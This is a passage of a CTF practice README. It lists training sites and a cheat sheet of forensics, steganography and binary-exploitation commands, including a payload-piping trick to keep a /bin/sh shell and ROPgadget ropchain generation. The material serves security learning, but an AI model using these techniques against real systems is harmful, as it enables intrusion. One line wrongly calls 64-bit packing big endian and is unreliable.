labs/projects for practice &amp;amp; some (slightly dated) lectures&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap&#34;&gt;how2heap&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Heap Exploitation series made by ASU&#39;s CTF team&lt;/li&gt; &#xA;   &lt;li&gt;Includes a very cool debugger feature to show how the exploits work&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ropemporium.com/&#34;&gt;ROPEmporium&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Set of challenges in every major architecture teaching Return-Oriented-Programming&lt;/li&gt; &#xA;   &lt;li&gt;Very high quality. Teaches the most basic to the most advanced techniques.&lt;/li&gt; &#xA;   &lt;li&gt;I&#39;m currently adding my own writeups &lt;a href=&#34;https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/ROPEmporium/&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://exploit.education/phoenix/&#34;&gt;Phoenix Exploit Education&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Tons of binary exploitation problems ordered by difficulty&lt;/li&gt; &#xA;   &lt;li&gt;Includes source and comes with a VM that has all of the binaries.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Rev&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://challenges.re/&#34;&gt;challenges.re&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;So many challenges 0_0&lt;/li&gt; &#xA;   &lt;li&gt;Tons of diversity&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://reversing.kr/&#34;&gt;reversing.kr&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://crackmes.one&#34;&gt;crackmes.one&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Tons of crackme (CTF) style challenges&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Web&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://websec.fr/#&#34;&gt;websec.fr&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Lots of web challenges with a good range of difficulty&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://webhacking.kr/chall.php&#34;&gt;webhacking.kr&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Has archive of lots of good web challenges&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://samsclass.info/129S/129S_S22.shtml&#34;&gt;Securing Web Applications&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Open source CCSF Course&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-juice-shop/&#34;&gt;OWASP Juice Shop&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Very much geared toward pentesting, but useful for exploring web in CTFs&lt;/li&gt; &#xA;   &lt;li&gt;Over 100 vulns/challenges in total&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/dashboard&#34;&gt;PortSwigger&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Gold standard for understanding web hacking&lt;/li&gt; &#xA;   &lt;li&gt;Tons of amazing challenges &amp;amp; explanations&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dvwa.co.uk/&#34;&gt;DVWA&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Very much geared toward pentesting, but useful for exploring web in CTFs&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.itsecgames.com/&#34;&gt;bWAPP&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Very much geared toward pentesting, but useful for exploring web in CTFs&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ctfchallenge.com/register&#34;&gt;CTF Challenge&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Collection of web challenges made by Adam Langley that are made to be as realistic as possible.&lt;/li&gt; &#xA;   &lt;li&gt;Good for getting bug bounty experience&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Crypto&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cryptohack.org/&#34;&gt;CryptoHack&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;I&#39;m currently working on putting writeups &lt;a href=&#34;https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cryptopals.com/&#34;&gt;cryptopals&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The OG crypto challenge site.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Smart Contracts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cryptohack.org/&#34;&gt;Capture the Ether&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Pentesting&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hacker101.com/videos&#34;&gt;hacker101&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hacksplaining.com/lessons&#34;&gt;hacksplaining&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://samsclass.info/127/127_S22.shtml&#34;&gt;Exploit developement&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Open source CCSF Course&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cseweb.ucsd.edu/~dstefan/cse127-fall21/&#34;&gt;Intro to Security&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;UC San Diego course taught by Deian Stefan&lt;/li&gt; &#xA;   &lt;li&gt;Covers basic pwn and crypto&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet&#34;&gt;Active Directory Cheat Sheet&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wadcoms.github.io/&#34;&gt;WADComs&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Interactive cheat sheet for Windows/AD environments&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://lolbas-project.github.io/&#34;&gt;LOLBAS&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Interactive cheat sheet for &lt;strong&gt;Windows&lt;/strong&gt; &#34;Living off the land&#34; binaries, scripts, and libraries for exploitation&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFOBins&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Interactive cheat sheet for &lt;strong&gt;Linux&lt;/strong&gt; &#34;Living off the land&#34; techniques.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;CTF Cheat Sheet&lt;/h1&gt; &#xA;&lt;h2&gt;Forensics / Steganography&lt;/h2&gt; &#xA;&lt;h4&gt;General&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Really good resource from John Hammond for different types of challenges: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/JohnHammond/ctf-katana&#34;&gt;https://github.com/JohnHammond/ctf-katana&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Another very great cheat sheet for creating and solving challenges: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/apsdehal/awesome-ctf/raw/master/README.md&#34;&gt;https://github.com/apsdehal/awesome-ctf/blob/master/README.md&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;file &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;file &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Determines the type of file&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;steghide &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;steghide extract -sf &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Extracts embedded files&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RickdeJager/stegseek&#34;&gt;stegseek&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;stegseek &amp;lt;file&amp;gt; &amp;lt;password list&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Extracts embedded files using a wordlist&lt;/li&gt; &#xA;   &lt;li&gt;super super quick&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;binwalk &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;binwalk -M --dd=&#34;.*&#34; &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Extracts embedded files&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;exiftool &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;exiftool &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Reads metadata&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;strings &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;strings &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Finds all printable characters in a file&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;hexedit &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;hexedit &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;You may have to change the file signature on some images for them to open&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;&gt;List of common file signatures&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Ghex (another hex editor but with GUI. Good if you need to jump to a certain byte) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;ghex &amp;lt;file.xyz&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;docx files are containers so you can unzip them to find hidden content &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;unzip &amp;lt;file.docx&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Grep | A good way to use grep to find the flag recursively: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;grep -r --text &#39;picoCTF{.*}&#39;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;egrep -r --text &#39;picoCTF{.*?}&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;You can change &#39;picoCTF&#39; to the beginning of the flag you are looking for&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Ltrace | Allows you to see what the code is doing as you run the program: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;ltrace ./&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;ltrace -s 100 ./&amp;lt;file&amp;gt;&lt;/code&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Ltrace shortens very long strings. You can use -s to increase how many characters ltrace shows. Good for when looking at strcmp that have large strings.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Audio&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Fax machine audio:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://devcraft.io/2018/04/08/sunshine-ctf-2018.html&#34;&gt;Example&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.dxsoft.com/en/products/seatty/&#34;&gt;Decoder&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SSTV (slow-scan tv) audio (moon stuff)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/25606&#34;&gt;Example&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04&#34;&gt;Decoder&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.blackcatsystems.com/software/sstv.html&#34;&gt;Alt Decoder&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Use these qsstv settings:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/.resources/SSTV_settings.png&#34; alt=&#34;SSTV settings&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Spectrogram image&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://academo.org/demos/spectrum-analyzer/&#34;&gt;Decoder&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Change pitch, speed, direction...&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://29a.ch/timestretch/&#34;&gt;Pitch, speed, tune&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://audiotrimmer.com/online-mp3-reverser/&#34;&gt;Reverse&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;DTMF (dual tone multiple frequency) phone keys&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;multimon-ng -a DTMF -t wav &amp;lt;file.wav&amp;gt;&lt;/code&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Keep in mind that these could me multitap letters. &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://www.dcode.fr/multitap-abc-cipher&#34;&gt;This&lt;/a&gt; can decode the numbers into text&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Cassette tape&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/25597&#34;&gt;Example&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/lunderhage/c64tapedecode&#34;&gt;Decoder&lt;/a&gt; (wav to &lt;strong&gt;tap&lt;/strong&gt; files)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Morse code&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://morsecode.world/international/decoder/audio-decoder-adaptive.html&#34;&gt;Decoder&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Image&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://stegonline.georgeom.net/upload&#34;&gt;stegsolve&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Switch through bits&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/korczis/foremost&#34;&gt;foremost&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Special tool for extracting images&lt;/li&gt; &#xA;   &lt;li&gt;Can be used to put together broken images (in pcap for example)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/beurtschipper/Depix&#34;&gt;Depix&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Unpixelate text&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Check if something was photoshopped (look at highlights)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://29a.ch/photo-forensics/#error-level-analysis&#34;&gt;https://29a.ch/photo-forensics/#error-level-analysis&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/zed-0xff/zsteg&#34;&gt;zsteg&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;LSB decoder&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lukechampine/jsteg&#34;&gt;jsteg&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;jpeg steganography solver&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://online.officerecovery.com/pixrecovery/&#34;&gt;pixrecovery&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;so far the most effective png recovery tool i&#39;ve found (as long as you don&#39;t care about watermarks)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.photopea.com/&#34;&gt;photopea&lt;/a&gt; also works very well&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Aloxaf/crc32fix&#34;&gt;crc32fix&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;fix height and width of png based on checksum&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sherlly/PCRT&#34;&gt;PCRT&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;fix png header and footer info&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/landaire/png-crc-fix&#34;&gt;png-crc-fix&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;fix png checksum&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;pngcheck&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;find out if there are errors in the png&lt;/li&gt; &#xA;   &lt;li&gt;pngcheck &#xA;    &lt;file&gt;&lt;/file&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Video&lt;/h4&gt; &#xA;&lt;h4&gt;Machine Image&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Recovering files &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;photorec &amp;lt;file.bin&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;You can mount an image as a virtual machine &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://habr.com/en/post/444940/&#34;&gt;https://habr.com/en/post/444940/&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Mount a &lt;code&gt;.img&lt;/code&gt; file: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;binwalk -M --dd=&#34;.*&#34; &amp;lt;fileName&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;run &lt;code&gt;file&lt;/code&gt; on output and select the Linux filesystem file&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;losetup /dev/loop&amp;lt;freeLoopNumber&amp;gt; &amp;lt;fileSystemFile&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Pcap&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Extract data with tcpflow &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;tcpflow -r &amp;lt;file.pcap&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Extract data with wireshark &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;File → Export Objects → Make selection&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Pwn / Binary Exploitation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;For this one, I suggest looking at my &lt;a href=&#34;https://github.com/Adamkadaban/LearnPwn&#34;&gt;LearnPwn&lt;/a&gt; repo instead, as this cheatsheet was made before I knew much about pwn&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;However, I have included &lt;em&gt;some&lt;/em&gt; notes amending to what I have here.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;General&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;check security of ELF &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;checksec &amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;rabin2 -I &amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;check security of PE &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/koutheir/binary-security-check&#34;&gt;binary-security-check&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;binary-security-check &amp;lt;bin&amp;gt;.exe&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;check seccomp bpf &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/david942j/seccomp-tools&#34;&gt;seccomp-tools&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;seccomp-tools dump ./&amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;look at symbols &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;readelf -s &amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;look at strings &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;rabin2 -z &amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;pack address to byte &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;little endian (for 32 bits) &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;python -c &#34;import pwn; print(pwn.p32(&amp;lt;intAddr&amp;gt;))&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;big endian (for 64 bits) &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;python -c &#34;import pwn; print(pwn.p64(&amp;lt;intAddr&amp;gt;))&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;pwntools automatically packs addresses with the correct endianness for you&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Buffer overflow&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you ever need to get a /bin/sh shell and you are sure it works but the program exits anyways, use this trick: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;( python -c &#34;print &#39;&amp;lt;PAYLOAD&amp;gt;&#39;&#34; ; cat ) | ./&amp;lt;program&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;pwntools does this with its &lt;code&gt;process.interactive()&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;PIE (Positional Independent Execution)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;determine random value &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;pwn cyclic &amp;lt;numChars&amp;gt;&lt;/code&gt; to generate payload&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;dmesg | tail | grep segfault&lt;/code&gt; to see where error was&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;pwn cyclic -l 0x&amp;lt;errorLocation&amp;gt;&lt;/code&gt; to see random offset to control instruction pointer&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=WNh3tFysYXY&amp;amp;ab_channel=JohnHammond&#34;&gt;example&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;NX (Non-executable)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We can use ROP (return oriented programming) to solve&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;ROP (for statically compiled binaries)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ROPGadget &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;view gadgets &amp;amp; automatically generate ropchains&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;ROPgadget --ropchain --binary &amp;lt;binary&amp;gt;&lt;/code&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;You can then add padding at the start of the code (based on the difference between your buffer and return address) and run the code to get a shell&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=MSy0rdi1vbo&amp;amp;ab_channel=BenGreenberg&#34;&gt;Demo&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; 